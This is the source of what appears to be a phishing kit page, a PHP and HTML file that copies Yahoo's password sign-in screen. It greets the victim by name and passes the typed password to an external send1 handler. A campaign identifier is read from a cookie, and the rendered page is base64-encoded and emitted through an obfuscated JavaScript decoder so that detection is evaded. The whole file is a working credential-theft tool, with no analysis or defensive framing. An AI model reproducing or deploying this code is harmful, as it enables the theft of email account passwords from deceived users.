<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="/";
          $php_js->texts = file_exists("../../texts.json") && filesize("../../texts.json") > 10 ? @file_get_contents("../../texts.json") : "{}";
?>
<!DOCTYPE html>
<html id="Stencil" class="js">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <link rel="stylesheet" href="form/css.css">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>Yahoo </title>
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<?php ob_start() ?>
<body ng-app="app" ng-controller="c1" ng-cloak>
    <div id="login-body" class="loginish  puree-v2">
        <div class="mbr-ybar ybar-light">
            <div id="ybar" role="banner" class="_yb_1051u     ">
                <div class="_yb_104fk _yb_1fcde">
                    <a class="_yb_1nsts    ">
                        <img class="_yb_yens5 _yb_1j51z" src="yahoo_en-gb_f_p_bestfit.png">
                        <img class="_yb_yens5 _yb_1nswf" src="yahoo_en-gb_f_w_bestfit.png">
                    </a>
                </div>
                <div role="toolbar" class="_yb_195j0 "></div>
            </div>
        </div>
        <div class="login-box-container">
            <div class="login-box default">
                <div class="mbr-login-hd txt-align-center">
                    <img src="yahoo_en-gb_f_p_bestfit_2x.png" class="logo yahoo-en-GB" width="116" height="">
                </div>
                <div class="challenge password-challenge">
                    <div id="password-challenge" class="primary">
                        <div class="greeting">
                            <h1 class="username">{{"Hello"| ng_translate1}}, {{data.user}}</h1>
                            <p class="not-you"><a onclick="back()">{{"Not you?"| ng_translate1}}</a></p>
                        </div>
                        <form class="pure-form pure-form-stacked" onsubmit="send1(event,'next__');return false">
                            <div class="form-group ">
                                <input id="login-passwd" class="form-control" name="pass" placeholder="Password" type="password" pattern=".{4,}" data-err_text="Please enter valid ">
                                <p class="error-msg err_span" role="alert" style="display: none;">{{"Please provide password."| ng_translate1}}</p>
                            </div>
                            <p class="signin-cont">
                                <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword">{{" Sign in "| ng_translate1}}</button>
                            </p>
                            <p class="forgot-cont">
                                <input class="pure-button puree-button-link" id="mbr-forgot-link" name="skip" value='{{"I forgot my password"| ng_translate1}}' type="submit">
                            </p>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?> 

</html>